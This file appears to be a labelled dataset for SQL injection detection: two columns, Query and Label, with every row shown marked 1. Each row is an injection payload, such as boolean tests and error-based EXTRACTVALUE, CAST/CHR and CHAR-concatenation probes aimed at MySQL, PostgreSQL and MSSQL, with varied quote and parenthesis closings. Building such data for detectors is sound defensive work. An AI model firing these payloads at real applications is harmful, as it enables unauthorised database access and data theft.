Query	Label
3),)))),',"(	1
3)'hRoCZw<'">gMciSC	1
3)) AND 3788=5477 AND (1660=1660	1
3) AND 2729=6903	1
3)') AND 2478=9182 AND ('wZdR'='wZdR	1
3)' AND 6748=9842 AND 'Bpuy'='Bpuy	1
3) AND 7197=4905	1
(SELECT (CASE WHEN (5626=9169) THEN '3)' ELSE (SELECT 9169 UNION SELECT 4022) END))	1
3)) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND (4034=4034	1
3) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071))	1
3)') AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND ('XZVg'='XZVg	1
3)' AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND 'JXAj'='JXAj	1
3) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071))	1
3)) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND (5487=5487	1
3) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC)	1
3)') AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND ('HNUi'='HNUi	1
3)' AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND 'cVPo'='cVPo	1
3) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC)	1
3)) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND (5948=5948	1
3) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)))	1
3)') AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND ('LoVv'='LoVv	1
3)' AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND 'pHzZ'='pHzZ	1
3) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)))	1
